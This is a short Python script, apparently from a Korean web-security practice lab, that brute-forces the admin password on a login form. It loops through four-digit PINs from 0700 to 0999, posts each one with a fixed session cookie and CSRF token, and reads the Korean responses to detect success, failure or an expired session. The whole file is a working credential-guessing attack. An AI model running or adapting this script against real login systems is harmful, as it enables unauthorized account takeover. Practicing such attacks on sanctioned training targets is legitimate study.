import requests

url = "https://elms2.skinfosec.co.kr:8110/practice/practice02/login"
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
cookies = {
    "JSESSIONID":"8B8E4E95B0F7173CA2CC25EC84922EA8"
}
data = {
    "_csrf":"0fd38ff0-628f-474d-9cf2-5b76c172039e",
    "memberid":"admin",
    "password":"1234"
}

for i in range(700, 1000):
    pw = str(i).zfill(4)
    data["password"] = pw
    res = requests.post(url, headers=headers, cookies=cookies, data=data) 
    #print(res.text)
    if '권한' in res.text:
        print('세션ID 새로 교체하세요.')
        break
    if '실패' in res.text:
        print('비밀번호 ['+ pw +'] 로그인 실패!')
    else:
        print('비밀번호 ['+ pw +'] 로그인 성공!')
        break